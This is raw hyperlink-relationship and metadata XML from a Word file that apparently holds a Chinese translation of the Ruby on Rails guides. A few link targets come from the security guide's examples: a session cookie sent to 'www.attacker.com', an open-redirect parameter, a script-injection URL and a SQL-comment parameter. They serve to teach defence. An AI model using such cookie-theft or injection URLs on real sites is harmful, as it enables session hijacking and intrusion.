Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/account/destroy" TargetMode="External"/><Relationship Id="rId701" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.harmless.com/img" TargetMode="External"/><Relationship Id="rId702" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId703" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com" TargetMode="External"/><Relationship Id="rId704" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/technoweenie/attachment" TargetMode="External"/><Relationship Id="rId705" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352" TargetMode="External"/><Relationship Id="rId706" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/plataformatec/devise" TargetMode="External"/><Relationship Id="rId707" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/binarylogic/authlogic" TargetMode="External"/><Relationship Id="rId708" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3006/user/activate" TargetMode="External"/><Relationship Id="rId709" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3006/user/activate?id=" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.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guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId580" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/rails-i18n/tree/master/rails/locale" TargetMode="External"/><Relationship Id="rId581" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/svenfuchs/i18n/tree/master" TargetMode="External"/><Relationship Id="rId582" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://i18n.lighthouseapp.com/projects/14948-rails-i18n/overview" TargetMode="External"/><Relationship Id="rId583" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://i18n.lighthouseapp.com/projects/14947-ruby-i18n/overview" TargetMode="External"/><Relationship Id="rId584" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.workingwithrails.com/person/9963-sven-fuchs" TargetMode="External"/><Relationship Id="rId585" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.workingwithrails.com/person/7476-karel-mina-k" TargetMode="External"/><Relationship Id="rId586" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.workingwithrails.com" TargetMode="External"/><Relationship Id="rId587" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId588" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Internationalization_and_localization" TargetMode="External"/><Relationship Id="rId589" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId260" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId261" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId262" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId263" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId264" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId265" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId266" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId267" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId268" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId269" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId710" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/" TargetMode="External"/><Relationship Id="rId711" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/" TargetMode="External"/><Relationship Id="rId712" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://recaptcha.net/" TargetMode="External"/><Relationship Id="rId713" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ambethia.com/recaptcha/" TargetMode="External"/><Relationship Id="rId714" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://nedbatchelder.com/text/stopbots.html" TargetMode="External"/><Relationship Id="rId715" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html" TargetMode="External"/><Relationship Id="rId716" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId717" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/" TargetMode="External"/><Relationship Id="rId718" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://livehttpheaders.mozdev.org/" TargetMode="External"/><Relationship Id="rId719" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId590" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId591" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId592" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId593" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId594" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId595" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId596" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId597" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId598" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId599" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId270" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId271" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId272" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId273" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId274" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId275" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basic.html" TargetMode="External"/><Relationship Id="rId276" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId277" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId278" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId279" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId720" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://pandalabs.pandasecurity.com/mpack-uncovered/" TargetMode="External"/><Relationship Id="rId721" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/" TargetMode="External"/><Relationship Id="rId722" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.attacker.com/" TargetMode="External"/><Relationship Id="rId723" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2" TargetMode="External"/><Relationship Id="rId724" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.rubyonrails.org/ticket/8895" TargetMode="External"/><Relationship Id="rId725" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/" TargetMode="External"/><Relationship Id="rId726" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://58.xx.xxx.xxx" TargetMode="External"/><Relationship Id="rId727" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://isc.sans.org/diary.html?storyid=3015" TargetMode="External"/><Relationship Id="rId728" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--" TargetMode="External"/><Relationship Id="rId729" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.securitylab.ru/test/sc.js%3E%3C/script%3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867</TotalTime>
  <Pages>338</Pages>
  <Words>137064</Words>
  <Characters>781267</Characters>
  <Application>Microsoft Macintosh Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>6510</Lines>
  <Paragraphs>1832</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>916499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万林 金</cp:lastModifiedBy>
  <cp:revision>56</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2012-08-30T05:34:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2012-12-21T01:58:00Z</dcterms:modified>
</cp:coreProperties>
</file>